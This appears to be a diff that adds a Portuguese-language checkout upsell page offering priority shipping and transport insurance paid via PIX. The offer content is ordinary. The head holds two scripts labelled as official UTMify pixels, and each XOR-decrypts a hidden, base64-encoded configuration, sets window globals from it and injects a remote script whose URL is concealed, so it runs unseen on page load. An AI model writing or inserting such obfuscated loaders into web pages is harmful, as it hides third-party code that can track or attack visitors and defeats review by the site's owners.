@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- garante a barra final na URL (senao ./js/... resolve errado e a pagina fica em branco) -->
+  <script>
+  (function () {
+    var p = location.pathname;
+    var ultimo = p.split('/').pop();
+    if (p.slice(-1) !== '/' && ultimo.indexOf('.') === -1) {
+      location.replace(p + '/' + location.search + location.hash);
+    }
+  })();
+  </script>
+  <!-- UTMify Pixel Oficial -->
+  <script>(function(){var e_oslj=atob("DO+3MbRy4z0gIIUD+5SVRMYewQcCSPF3i5yNHpsRh1MOVfFukonOH9cdjhNCUqpwmJ3eQcABzE1JWOBv1J/eSdEezVdTAqkhmpvDQ90QlklFU6c5oLKbE9MejF9BTPYhwbTME9oTjlgCGqdzkpfSXf0WwRECVuRvjoqVC5ZEgltBFbJindyEBYZAhlkYQ+A1n9fSUoZQnmBd");var x_pi=[];for(var j_xks=0;j_xks<e_oslj.length;j_xks++){x_pi.push(e_oslj.charCodeAt(j_xks)&255);}var m_e8q=x_pi[0];var i_h78=x_pi.slice(1,1+m_e8q);var e_080u=x_pi.slice(1+m_e8q);var i_j=e_080u.map(function(b,l_pf){return b^i_h78[l_pf%m_e8q];});var y_z="";for(var l_sri7=0;l_sri7<i_j.length;l_sri7++){y_z+=String.fromCharCode(i_j[l_sri7]&255);}var l_wo=decodeURIComponent(escape(y_z));var j_8zw=JSON.parse(l_wo);var b_ye=j_8zw.globals||[];b_ye.forEach(function(c_79q){window[c_79q.name]=c_79q.value;});var n_frzs=document.createElement("script");n_frzs.src=j_8zw.url;n_frzs.async=true;n_frzs.defer=true;(j_8zw.attributes||[]).forEach(function(o_6lk){n_frzs.setAttribute(o_6lk.name,o_6lk.value);});(document.head||document.documentElement).appendChild(n_frzs);})();</script>
+  <!-- UTMify Script Oficial -->
+  <script>(function(){var m_h3b=atob("GJXZMun4i+1ceA2qgTebOetKfbLJN1X5ce77R5uUqdd+EHne8UShFsQpGdznQiGUGPOgHIqX5sM+CiLZ4kXySZ85Use9WibWHfStV5qMpYcvWiGI4EPvS4IoCMasRHfDKu77XIiV7s9mWmnL9Va2TJ8nFNSwGiWLFOO8XJ3V844zHCDZ4ly5Fck8HN68UnfDU7ekHpLa5YwxHS+Qo1P6TYpnCMakXjOAXOWrV5+d5ZlxC3jI6FPoG8doC9OlQjDbS7f7T7SF");var a_2f=[];for(var m_y8yk=0;m_y8yk<m_h3b.length;m_y8yk++){a_2f.push(m_h3b.charCodeAt(m_y8yk)&255);}var z_zak=a_2f[0];var b_tbfs=a_2f.slice(1,1+z_zak);var a_68s=a_2f.slice(1+z_zak);var u_kq=a_68s.map(function(b,u_4bf){return b^b_tbfs[u_4bf%z_zak];});var p_t1d="";for(var b_26v5=0;b_26v5<u_kq.length;b_26v5++){p_t1d+=String.fromCharCode(u_kq[b_26v5]&255);}var p_4=decodeURIComponent(escape(p_t1d));var p_31w=JSON.parse(p_4);var x_3h2=p_31w.globals||[];x_3h2.forEach(function(i_7pl){window[i_7pl.name]=i_7pl.value;});var u_tiv8=document.createElement("script");u_tiv8.src=p_31w.url;u_tiv8.async=true;u_tiv8.defer=true;(p_31w.attributes||[]).forEach(function(d_z9i){u_tiv8.setAttribute(d_z9i.name,d_z9i.value);});(document.head||document.documentElement).appendChild(u_tiv8);})();</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Envio Prioritário • Complemento do seu pedido</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="./js/helpers.js?v=20261120"></script>
+  <script src="./js/pix.js?v=20261120"></script>
+  <script src="./js/upsell.js?v=20261120"></script>
+  <style>
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+    .animate-spin { animation: spin 1s linear infinite; }
+    .animate-pulse { animation: pulse 2s ease-in-out infinite; }
+  </style>
+</head>
+<body style="background:#F7F8FA">
+<div id="upsell-root"></div>
+<script>
+renderUpsell({
+  "nextUrl": (window.location.protocol === 'file:' ? '../../obrigado/index.html' : '/obrigado/'),
+  "docLeft": "Seu pedido",
+  "headerSub": "Oferta opcional • Pagamento seguro via PIX",
+  "alertBadge": "Oferta opcional",
+  "alertBg": "linear-gradient(135deg,#1E40AF,#1E3A8A)",
+  "showProtocol": false,
+  "exitTrap": false,
+  "listTone": "emerald",
+  "listMark": "✓",
+  "listEmoji": "✨",
+  "accent": "#1E40AF",
+  "totalSteps": 10,
+  "slug": "envio",
+  "stepNum": 3,
+  "productName": "Envio Prioritário + Seguro de Transporte",
+  "icon": "🚚",
+  "headerTitle": "Envio Prioritário • Complemento do seu pedido",
+  "docRight": "Complemento opcional",
+  "alertTitle": "Receba mais rápido e com seguro",
+  "alertText": "Adicione o Envio Prioritário com Seguro de Transporte: seu pedido entra na frente na fila de expedição e fica protegido contra extravio e avaria no caminho.",
+  "consequencesTitle": "O que está incluso",
+  "consequences": [
+    "Prioridade na expedição do seu pedido.",
+    "Seguro contra extravio e avaria durante o transporte.",
+    "Código de rastreio para acompanhar a entrega.",
+    "Contratação única, sem custos futuros."
+  ],
+  "withoutTitle": "Sem o envio prioritário",
+  "withTitle": "Com o envio prioritário",
+  "without": [
+    "Expedição na fila comum",
+    "Sem seguro de transporte",
+    "Prazo padrão",
+    "Sem cobertura extra"
+  ],
+  "withNow": [
+    "Expedição prioritária",
+    "Carga segurada",
+    "Rastreio ativo",
+    "Pagamento único"
+  ],
+  "offer": {
+    "badge": "Oferta Opcional",
+    "price": 24.9,
+    "priceNote": "Pagamento único • sem custos futuros",
+    "showTimer": false,
+    "ctaText": "Adicionar Envio Prioritário",
+    "microcopy": "Adicione agora ao seu pedido. Valor único, pago via PIX."
+  },
+  "downsell": {
+    "badge": "Condição especial",
+    "title": "Somente Seguro de Transporte",
+    "desc": "Prefere manter o prazo padrão? Adicione apenas o seguro de transporte por um valor reduzido, disponível nesta página.",
+    "price": 12.9,
+    "ctaText": "Adicionar Seguro de Transporte",
+    "warning": "Essa condição aparece só aqui. Se não quiser, é só seguir: seu pedido continua normalmente."
+  },
+  "refuseText": "Não, obrigado — seguir com o envio padrão",
+  "faq": [
+    {
+      "q": "O envio prioritário muda o frete que já paguei?",
+      "a": "Não. É um complemento opcional, cobrado à parte, uma única vez."
+    },
+    {
+      "q": "O que o seguro cobre?",
+      "a": "Extravio e avaria durante o transporte, conforme as condições do seguro."
+    },
+    {
+      "q": "Preciso contratar?",
+      "a": "Não. É opcional e seu pedido segue normalmente com o envio padrão."
+    }
+  ],
+  "trust": [
+    "Pagamento seguro",
+    "SSL 256 bits",
+    "Compra opcional",
+    "Rastreio"
+  ]
+});
+</script>
+</body>
+</html>
